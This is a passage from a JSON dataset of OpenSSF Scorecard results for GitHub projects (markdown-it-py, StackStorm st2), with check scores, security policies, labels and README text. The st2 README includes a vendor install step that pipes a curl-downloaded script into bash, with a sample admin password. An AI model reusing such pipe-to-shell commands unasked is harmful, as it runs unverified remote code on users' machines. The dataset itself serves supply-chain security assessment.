                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark.yml:26",
                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark.yml:27",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:96",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:97",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:124",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:45",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:46",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:74",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:75",
                        "Info:   0 out of  14 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   6 third-party GitHubAction dependencies pinned",
                        "Info:   1 out of  10 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/benchmark.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/fuzz.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/executablebooks/markdown-it-py/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nWe generally only support the latest major release,\nalthough critical bug fixes can be released for older versions.\n\n## Reporting a Vulnerability\n\nTo report a security issue, please email <executablebooks@gmail.com> with a description of the issue,\nthe steps you took to create the issue, affected versions, and, if known, mitigations for the issue.\nOur team will respond within 3 working days of your email.\nIf the issue is confirmed as a vulnerability, we will open a Security Advisory.\nThis project follows a 90 day disclosure timeline.\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "documentation",
            "duplicate",
            "enhancement",
            "github_actions",
            "good first issue",
            "help wanted",
            "invalid",
            "plugins",
            "python",
            "question",
            "wontfix"
        ],
        "README_content": "# markdown-it-py\n\n[![Github-CI][github-ci]][github-link]\n[![Coverage Status][codecov-badge]][codecov-link]\n[![PyPI][pypi-badge]][pypi-link]\n[![Conda][conda-badge]][conda-link]\n[![Code style: black][black-badge]][black-link]\n[![PyPI - Downloads][install-badge]][install-link]\n\n<p align=\"center\">\n  <img alt=\"markdown-it-py icon\" src=\"https://raw.githubusercontent.com/executablebooks/markdown-it-py/master/docs/_static/markdown-it-py.svg\">\n</p>\n\n> Markdown parser done right.\n\n- Follows the __[CommonMark spec](http://spec.commonmark.org/)__ for baseline parsing\n- Configurable syntax: you can add new rules and even replace existing ones.\n- Pluggable: Adds syntax extensions to extend the parser (see the [plugin list][md-plugins]).\n- High speed (see our [benchmarking tests][md-performance])\n- Easy to configure for [security][md-security]\n- Member of [Google's Assured Open Source Software](https://cloud.google.com/assured-open-source-software/docs/supported-packages)\n\nThis is a Python port of [markdown-it], and some of its associated plugins.\nFor more details see: <https://markdown-it-py.readthedocs.io>.\n\nFor details on [markdown-it] itself, see:\n\n- The __[Live demo](https://markdown-it.github.io)__\n- [The markdown-it README][markdown-it-readme]\n\n**See also:** [markdown-it-pyrs](https://github.com/chrisjsewell/markdown-it-pyrs) for an experimental Rust binding,\nfor even more speed!\n\n## Installation\n\n```bash\nconda install -c conda-forge markdown-it-py\n```\n\nor\n\n```bash\npip install markdown-it-py[plugins]\n```\n\nor with extras\n\n```bash\nconda install -c conda-forge markdown-it-py linkify-it-py mdit-py-plugins\npip install markdown-it-py[linkify,plugins]\n```\n\n## Usage\n\n### Python API Usage\n\nRender markdown to HTML with markdown-it-py and a custom configuration\nwith and without plugins and features:\n\n```python\nfrom markdown_it import MarkdownIt\nfrom mdit_py_plugins.front_matter import front_matter_plugin\nfrom mdit_py_plugins.footnote import footnote_plugin\n\nmd = (\n    MarkdownIt('commonmark' ,{'breaks':True,'html':True})\n    .use(front_matter_plugin)\n    .use(footnote_plugin)\n    .enable('table')\n)\ntext = (\"\"\"\n---\na: 1\n---\n\na | b\n- | -\n1 | 2\n\nA footnote [^1]\n\n[^1]: some details\n\"\"\")\ntokens = md.parse(text)\nhtml_text = md.render(text)\n\n## To export the html to a file, uncomment the lines below:\n# from pathlib import Path\n# Path(\"output.html\").write_text(html_text)\n```\n\n### Command-line Usage\n\nRender markdown to HTML with markdown-it-py from the\ncommand-line:\n\n```console\nusage: markdown-it [-h] [-v] [filenames [filenames ...]]\n\nParse one or more markdown files, convert each to HTML, and print to stdout\n\npositional arguments:\n  filenames      specify an optional list of files to convert\n\noptional arguments:\n  -h, --help     show this help message and exit\n  -v, --version  show program's version number and exit\n\nInteractive:\n\n  $ markdown-it\n  markdown-it-py [version 0.0.0] (interactive)\n  Type Ctrl-D to complete input, or Ctrl-C to exit.\n  >>> # Example\n  ... > markdown *input*\n  ...\n  <h1>Example</h1>\n  <blockquote>\n  <p>markdown <em>input</em></p>\n  </blockquote>\n\nBatch:\n\n  $ markdown-it README.md README.footer.md > index.html\n\n```\n\n## References / Thanks\n\nBig thanks to the authors of [markdown-it]:\n\n- Alex Kocharin [github/rlidwka](https://github.com/rlidwka)\n- Vitaly Puzrin [github/puzrin](https://github.com/puzrin)\n\nAlso [John MacFarlane](https://github.com/jgm) for his work on the CommonMark spec and reference implementations.\n\n[github-ci]: https://github.com/executablebooks/markdown-it-py/actions/workflows/tests.yml/badge.svg?branch=master\n[github-link]: https://github.com/executablebooks/markdown-it-py\n[pypi-badge]: https://img.shields.io/pypi/v/markdown-it-py.svg\n[pypi-link]: https://pypi.org/project/markdown-it-py\n[conda-badge]: https://anaconda.org/conda-forge/markdown-it-py/badges/version.svg\n[conda-link]: https://anaconda.org/conda-forge/markdown-it-py\n[codecov-badge]: https://codecov.io/gh/executablebooks/markdown-it-py/branch/master/graph/badge.svg\n[codecov-link]: https://codecov.io/gh/executablebooks/markdown-it-py\n[black-badge]: https://img.shields.io/badge/code%20style-black-000000.svg\n[black-link]: https://github.com/ambv/black\n[install-badge]: https://img.shields.io/pypi/dw/markdown-it-py?label=pypi%20installs\n[install-link]: https://pypistats.org/packages/markdown-it-py\n\n[CommonMark spec]: http://spec.commonmark.org/\n[markdown-it]: https://github.com/markdown-it/markdown-it\n[markdown-it-readme]: https://github.com/markdown-it/markdown-it/blob/master/README.md\n[md-security]: https://markdown-it-py.readthedocs.io/en/latest/security.html\n[md-performance]: https://markdown-it-py.readthedocs.io/en/latest/performance.html\n[md-plugins]: https://markdown-it-py.readthedocs.io/en/latest/plugins.html\n",
        "num_commits": 320,
        "project_age_days": 1679,
        "project_created_at": "2020-03-25",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 27,
        "num_pull": 240,
        "num_issues": 323,
        "num_opening_issue": 38,
        "project_size(kB)": 1446,
        "num_stargazers": 720,
        "num_watchers": 720,
        "num_forks": 67,
        "num_subscribers": 22,
        "SecurityPolicy_created_at": "2023-02-22 05:32:13",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "cf8b2d8c561233d4c18c55e80b68c8d06850fda6",
                "url": "https://github.com/executablebooks/markdown-it-py/commit/cf8b2d8c561233d4c18c55e80b68c8d06850fda6",
                "date": "2023-02-22 05:32:13"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "stackstorm/st2",
        "project_url": "https://github.com/stackstorm/st2",
        "SSF": {
            "date": "2024-10-29T23:54:13+07:00",
            "repo": {
                "name": "github.com/stackstorm/st2",
                "commit": "791ce96647c176c2a61607f700770f34c796b98e"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'v2.10'",
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Info: required approving review count is 2 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 1,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "5 out of 5 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: seatshare contributor org/company found, LyticalVentures contributor org/company found, jclouds contributor org/company found, monitoringsucks contributor org/company found, HACKthePLANET contributor org/company found, Wadodo contributor org/company found, go-vela contributor org/company found, voxpupuli contributor org/company found, cloudkick contributor org/company found, pantsbuild contributor org/company found, sentinel-one contributor org/company found, gopher-net contributor org/company found, RandomsCTF contributor org/company found, opsdroid contributor org/company found, toddproject contributor org/company found, nre-learning contributor org/company found, microsoft contributor org/company found, blue cycle contributor org/company found, apache contributor org/company found, StackStorm contributor org/company found, GoInnovation contributor org/company found, StackStorm-Exchange contributor org/company found, intive contributor org/company found, devfest-berlin contributor org/company found, luvit contributor org/company found, uber contributor org/company found, bitops-plugins contributor org/company found, voxpupuli  @stackstorm-exchange contributor org/company found, BlueCycleOps contributor org/company found, extremenetworks contributor org/company found, headroom contributor org/company found, CoachSpree contributor org/company found, bitovi contributor org/company found, tungstenfabric contributor org/company found, EncoreTechnologies contributor org/company found, Syncurity contributor org/company found, CiscoSecurity contributor org/company found, nko contributor org/company found, st2sandbox contributor org/company found, cloudflare contributor org/company found, ammeon contributor org/company found, wowsurvey contributor org/company found, frymanio contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 43 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yaml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/checks.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/checks.yaml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/checks.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:80: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:162: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:239: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:343: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:531: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:592: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:610: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:615: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yaml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/lint.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yaml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/lint.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/microbenchmarks.yaml:77: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/microbenchmarks.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/microbenchmarks.yaml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/microbenchmarks.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/microbenchmarks.yaml:114: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/microbenchmarks.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/microbenchmarks.yaml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/microbenchmarks.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/orquesta-integration-tests.yaml:123: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/orquesta-integration-tests.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/orquesta-integration-tests.yaml:184: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/orquesta-integration-tests.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/orquesta-integration-tests.yaml:199: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/orquesta-integration-tests.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/orquesta-integration-tests.yaml:204: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/orquesta-integration-tests.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pants.yaml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/pants.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pants.yaml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/pants.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/test.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yaml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/StackStorm/st2/test.yaml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: scripts/ci/submit-codecov-coverage.sh:22",
                        "Warn: pipCommand not pinned by hash: scripts/ci/submit-codecov-coverage.sh:23",
                        "Warn: pipCommand not pinned by hash: scripts/ci/submit-codecov-coverage.sh:24",
                        "Warn: pipCommand not pinned by hash: scripts/github/install-virtualenv.sh:9",
                        "Warn: pipCommand not pinned by hash: scripts/github/install-virtualenv.sh:11",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:241",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:242",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:253",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:259",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:265",
                        "Warn: pipCommand not pinned by hash: st2common/bin/st2-run-pack-tests:279",
                        "Warn: pipCommand not pinned by hash: tools/st2-setup-examples:27",
                        "Warn: pipCommand not pinned by hash: tools/st2-setup-tests:62",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:225",
                        "Info:   0 out of  18 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   3 out of  10 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  14 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/checks.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/lint.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/microbenchmarks.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/orquesta-integration-tests.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pants.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/stackstorm/st2/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policies and Procedures\n\nIf you believe you found a security issue or a vulnerability, please send a description of it to\nour private mailing list at info [at] stackstorm [dot] com.\n\nOnce you've submitted an issue, you should receive an acknowledgment from one our of team members\nin 48 hours or less. If further action is necessary, you may receive additional follow-up emails.\n\nFor more information, please refer to https://docs.stackstorm.com/latest/security.html\n",
        "project_all_labels": [
            "action aliases",
            "ansible",
            "API",
            "API/v2",
            "breaking change",
            "bug",
            "bug fix",
            "chatops",
            "CLI",
            "complexity:easy",
            "complexity:hard",
            "complexity:medium",
            "component:st2auth",
            "component:st2client",
            "component:st2web",
            "database",
            "deployment",
            "deprecation",
            "Docker",
            "documentation",
            "duplicate",
            "enhancement",
            "external dependency",
            "feature",
            "good first issue",
            "HA",
            "hacktoberfest-accepted",
            "help wanted",
            "infrastructure: ci/cd",
            "inquiries",
            "invalid",
            "K8s",
            "logging",
            "maintenance",
            "metrics",
            "migrations",
            "mongodb",
            "nginx",
            "no changelog",
            "OS support",
            "output schema",
            "packs",
            "pantsbuild",
            "performance",
            "policies",
            "proposal",
            "python3",
            "question",
            "rabbitmq",
            "RBAC",
            "refactor",
            "regression",
            "runners",
            "security",
            "service: action runner",
            "service: api",
            "service: auth api",
            "service: rules engine",
            "service: scheduler",
            "service: workflow engine",
            "size/L",
            "size/M",
            "size/S",
            "size/XL",
            "size/XS",
            "size/XXL",
            "SSO",
            "st2-packages",
            "stale",
            "status: potential performance implications",
            "status:can't reproduce",
            "status:need more info",
            "status:needs changes",
            "status:needs cla",
            "status:needs tests",
            "status:not an issue",
            "status:on hold",
            "status:to be verified",
            "status:under discussion",
            "tests",
            "TSC",
            "TSC:voting",
            "unicode",
            "WIP",
            "wontfix",
            "workflows: action chain",
            "workflows: orquesta"
        ],
        "README_content": "[![StackStorm](https://github.com/stackstorm/st2/raw/master/stackstorm_logo.png)](https://www.stackstorm.com)\n\n**StackStorm** is a platform for integration and automation across services and tools, taking actions in response to events. Learn more at [www.stackstorm.com](http://www.stackstorm.com/product).\n\n[![Build Status](https://github.com/StackStorm/st2/actions/workflows/ci.yaml/badge.svg)](https://github.com/StackStorm/st2/actions/workflows/ci.yaml)\n[![Packages Build Status](https://circleci.com/gh/StackStorm/st2/tree/master.svg?style=shield)](https://circleci.com/gh/StackStorm/st2)\n[![Codecov](https://codecov.io/github/StackStorm/st2/badge.svg?branch=master&service=github)](https://codecov.io/github/StackStorm/st2?branch=master)\n[![CII Best Practices](https://bestpractices.coreinfrastructure.org/projects/1833/badge)](https://bestpractices.coreinfrastructure.org/projects/1833)\n![Python 3.6,3.8](https://img.shields.io/badge/python-3.6,%203.8-blue)\n[![Apache Licensed](https://img.shields.io/github/license/StackStorm/st2)](LICENSE)\n[![Join our community Slack](https://img.shields.io/badge/slack-stackstorm-success.svg?logo=slack)](https://stackstorm.com/community-signup)\n[![deb/rpm packages](https://img.shields.io/badge/deb/rpm-Packagecloud-%236366f1)](https://packagecloud.io/StackStorm/)\n[![Code Search](https://img.shields.io/badge/code%20search-Sourcegraph-%2300B4F2?logo=sourcegraph)](https://sourcegraph.com/stackstorm)\n[![GitHub Discussions](https://img.shields.io/github/discussions/stackstorm/st2)](https://github.com/StackStorm/st2/discussions)\n[![Twitter Follow](https://img.shields.io/twitter/follow/StackStorm?style=social)](https://twitter.com/StackStorm/)\n\n---\n\n## TL;DR\n\n* Install Get yourself a clean 64-bit Linux box that fits the [system requirements](https://docs.stackstorm.com/install/system_requirements.html). Run the installer script:\n\n   ```bash\n   curl -sSL https://stackstorm.com/packages/install.sh | bash -s -- --user=st2admin --password=Ch@ngeMe\n   ```\n* Read the docs: [https://docs.stackstorm.com/index.html](https://docs.stackstorm.com/install/index.html)\n* Questions? Check out [forum.stackstorm.com](https://forum.stackstorm.com/)\n* Or join our [Slack community](https://stackstorm.com/community-signup)\n\n## StackStorm Overview\n\n[![StackStorm 5 min Intro Video](https://cloud.githubusercontent.com/assets/1294734/10356016/16278d0a-6d27-11e5-987d-c8a7629a69ed.png)](https://www.youtube.com/watch?v=pzZws3ftDtA)\n\n### About\n\nStackStorm is a platform for integration and automation across services and tools. It ties together your existing infrastructure and application environment so you can more easily automate that environment -- with a particular focus on taking actions in response to events.\n\nStackStorm helps automate common operational patterns. Some examples are:\n\n* **Facilitated Troubleshooting** - triggering on system failures captured by Nagios, Sensu, New Relic and 